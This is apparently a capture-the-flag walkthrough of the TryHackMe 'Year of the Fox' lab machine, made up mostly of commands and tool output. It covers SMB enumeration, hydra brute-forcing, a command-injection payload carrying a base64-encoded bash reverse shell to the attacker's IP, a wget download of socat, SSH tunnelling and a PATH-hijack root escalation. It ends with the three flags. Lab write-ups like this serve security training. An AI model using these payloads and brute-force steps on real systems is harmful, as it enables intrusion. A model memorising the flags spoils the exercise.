# Year of the Fox

Don't underestimate the sly old fox... This room includes a competition with over $4,000 worth of prizes to celebrate TryHackMe hitting 100k members!

[Year of the Fox](https://tryhackme.com/room/yotf)

## Topic's

- Network Enumeration
- SMB Enumeration
- Linux Enumeration
- Brute Force (http-get)
- Code Injection
- Network Tunneling
- Brute Force (SSH)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 2 Hack the machine and obtain the flags

Can you get past the wily fox?

The competition has now ended.

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ sudo nmap -A -sS -sC -sV -O 10.10.137.8
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 14:23 CEST
Nmap scan report for 10.10.137.8
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/17%OT=80%CT=1%CU=40717%PV=Y%DS=2%DC=T%G=Y%TM=5F8AE2
OS:48%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2020-10-17T13:23:36+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-17T12:23:36
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.90 ms 10.8.0.1
2   35.01 ms 10.10.137.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.95 seconds
```

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ smbclient -L //10.10.137.8
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ enum4linux -a 10.10.137.8
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct 17 14:24:58 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.137.8
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================
|    Enumerating Workgroup/Domain on 10.10.137.8    |
 ===================================================
[+] Got domain/workgroup name: YEAROFTHEFOX

 ===========================================
|    Nbtstat Information for 10.10.137.8    |
 ===========================================
Looking up status of 10.10.137.8
        YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
        YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
        YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================
|    Session Check on 10.10.137.8    |
 ====================================
[+] Server 10.10.137.8 allows sessions using username '', password ''

 ==========================================
|    Getting domain SID for 10.10.137.8    |
 ==========================================
Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =====================================
|    OS information on 10.10.137.8    |
 =====================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.137.8 from smbclient:
[+] Got OS info for 10.10.137.8 from srvinfo:
        YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================
|    Users on 10.10.137.8    |
 ============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox      Name: fox       Desc:

user:[fox] rid:[0x3e8]

 ========================================
|    Share Enumeration on 10.10.137.8    |
 ========================================

        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.137.8
//10.10.137.8/yotf      Mapping: DENIED, Listing: N/A
//10.10.137.8/IPC$      [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================
|    Password Policy Information for 10.10.137.8    |
 ===================================================


[+] Attaching to 10.10.137.8 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] YEAR-OF-THE-FOX
        [+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================
|    Groups on 10.10.137.8    |
 =============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================
|    Users on 10.10.137.8 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''
S-1-5-21-978893743-2663913856-222388731-500 *unknown*\*unknown* (8)
S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

 ============================================
|    Getting printer info for 10.10.137.8    |
 ============================================
No printers returned.


enum4linux complete on Sat Oct 17 14:29:17 2020
```

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.137.8 http-get
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-17 14:26:10
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.137.8:80/
[STATUS] 5155.00 tries/min, 5155 tries in 00:01h, 14339244 to do in 46:22h, 16 active
[80][http-get] host: 10.10.137.8   login: rascal   password: 987321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-17 14:28:02
```

`rascal:987321`

[http://10.10.137.8/](http://10.10.137.8/)

`echo -n "bash -i >& /dev/tcp/10.8.106.222/9001 0>&1" | base64`

`{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEwNi4yMjIvOTAwMSAwPiYx | base64 -d | bash; \""}`

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.137.8] 41634
bash: cannot set terminal process group (726): Inappropriate ioctl for device
bash: no job control in this shell
www-data@year-of-the-fox:/var/www/html/assets/php$ cd ../../
cd ../../
www-data@year-of-the-fox:/var/www/html$ cd ../
cd ../
www-data@year-of-the-fox:/var/www$ ls
ls
files
html
web-flag.txt
www-data@year-of-the-fox:/var/www$ cat web-flag.txt
cat web-flag.txt
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
www-data@year-of-the-fox:/var/www$ cd files
cd files
www-data@year-of-the-fox:/var/www/files$ ls
ls
creds2.txt
fox.txt
important-data.txt
www-data@year-of-the-fox:/var/www/files$ cat creds2.txt
cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
www-data@year-of-the-fox:/var/www/files$ cat fox.txt
cat fox.txt
www-data@year-of-the-fox:/var/www/files$ cat importent-data.txt
cat importent-data.txt
cat: importent-data.txt: No such file or directory
www-data@year-of-the-fox:/var/www/files$ cat important-data.txt
cat important-data.txt
www-data@year-of-the-fox:/var/www/files$
```

```
www-data@year-of-the-fox:/tmp$ wget 10.8.106.222/socat
wget 10.8.106.222/socat
--2020-10-17 13:46:24--  http://10.8.106.222/socat
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 378384 (370K) [application/octet-stream]
Saving to: 'socat'

     0K .......... .......... .......... .......... .......... 13%  390K 1s
    50K .......... .......... .......... .......... .......... 27%  833K 1s
   100K .......... .......... .......... .......... .......... 40%  767K 0s
   150K .......... .......... .......... .......... .......... 54%  732K 0s
   200K .......... .......... .......... .......... .......... 67%  817K 0s
   250K .......... .......... .......... .......... .......... 81%  834K 0s
   300K .......... .......... .......... .......... .......... 94%  881K 0s
   350K .......... .........                                  100%  764K=0.5s

2020-10-17 13:46:25 (704 KB/s) - 'socat' saved [378384/378384]

www-data@year-of-the-fox:/tmp$ chmod +x socat
chmod +x socat
www-data@year-of-the-fox:/tmp$ ls -la
ls -la
total 380
drwxrwxrwt  2 root     root       4096 Oct 17 13:46 .
drwxr-xr-x 22 root     root       4096 May 29 23:25 ..
-rwxr-xr-x  1 www-data www-data 378384 Oct 17 13:45 socat
www-data@year-of-the-fox:/tmp$ ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
```

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.137.8:2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-17 14:46:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.137.8:2222/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 14344223 to do in 1328:11h, 16 active
[STATUS] 166.67 tries/min, 500 tries in 00:03h, 14343903 to do in 1434:24h, 16 active
[2222][ssh] host: 10.10.137.8   login: fox   password: chance
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-17 14:51:59
```

```
kali@kali:~/CTFs/tryhackme/Year of the Fox$ ssh fox@10.10.137.8 -p 2222
The authenticity of host '[10.10.137.8]:2222 ([10.10.137.8]:2222)' can't be established.
ECDSA key fingerprint is SHA256:UUzRY8LX3i6B/7AWHKO+WY0vkPQsuyyNpEvf2BI6jMU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.137.8]:2222' (ECDSA) to the list of known hosts.
fox@10.10.137.8's password:


        __   __                       __   _   _            _____
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  <
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\



fox@year-of-the-fox:~$ ls -la
total 36
drwxr-x--- 5 fox  fox  4096 Jun 20 02:43 .
drwxr-xr-x 4 root root 4096 May 28 21:16 ..
lrwxrwxrwx 1 fox  fox     9 May 28 21:16 .bash_history -> /dev/null
-rw-r--r-- 1 fox  fox   220 May 28 21:10 .bash_logout
-rw-r--r-- 1 fox  fox  3771 May 28 21:10 .bashrc
drwx------ 2 fox  fox  4096 May 28 21:16 .cache
drwx------ 3 fox  fox  4096 May 28 21:16 .gnupg
-rw-r--r-- 1 fox  fox   807 May 28 21:10 .profile
drwxr-xr-x 2 fox  fox  4096 Jun 20 02:08 samba
-rw-r--r-- 1 fox  fox     0 May 28 21:16 .sudo_as_admin_successful
-rw-r--r-- 1 root root   38 May 31 23:38 user-flag.txt
fox@year-of-the-fox:~$ cat user-flag.txt
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
```

```
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown

fox@year-of-the-fox:~$ cp /bin/bash /tmp/poweroff
fox@year-of-the-fox:~$ chmod +x /tmp/poweroff
fox@year-of-the-fox:~$ export PATH=/tmp:$PATH
fox@year-of-the-fox:~$ sudo /usr/sbin/shutdown
root@year-of-the-fox:~# ls -l /root
total 4
-rw-r--r-- 1 root root 21 May 31 23:37 root.txt
root@year-of-the-fox:~# ls -la /root
total 36
drwx------  5 root root 4096 Oct 17 13:21 .
drwxr-xr-x 22 root root 4096 May 29 23:25 ..
lrwxrwxrwx  1 root root    9 May 28 21:16 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 30 15:40 .cache
drwx------  3 root root 4096 May 30 15:40 .gnupg
drwxr-xr-x  3 root root 4096 May 28 21:18 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   21 May 31 23:37 root.txt
-rw-r--r--  1 root root   75 May 31 23:08 .selected_editor
root@year-of-the-fox:~# cd /home/rascal/
```

```
root@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root | tr -d '\n'
THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}
```

1. Whats the contents of the web flag?

`THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}`

2. What the contents of the user flag?

`THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}`

3. Whats the contents of the root flag?

`THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}`
